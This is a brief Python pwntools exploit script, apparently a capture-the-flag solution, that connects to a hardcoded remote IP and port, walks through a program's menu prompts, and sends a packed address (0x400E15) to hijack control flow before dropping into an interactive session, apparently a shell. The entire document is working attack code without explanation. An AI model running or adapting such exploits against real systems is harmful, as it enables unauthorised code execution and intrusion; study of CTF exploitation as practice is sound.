from pwn import *

r = remote("110.10.147.122", 12828)

r.sendlineafter("idx : ", "12385")
r.sendlineafter(">> ", "1")
r.sendlineafter(">> ", "2")
r.sendlineafter("today? \n", p64(0x0000000000400E15))
r.sendlineafter(">> ", "2")
r.sendlineafter("meet : ", "2")
r.sendlineafter("meet : ", "Colleague")

r.interactive()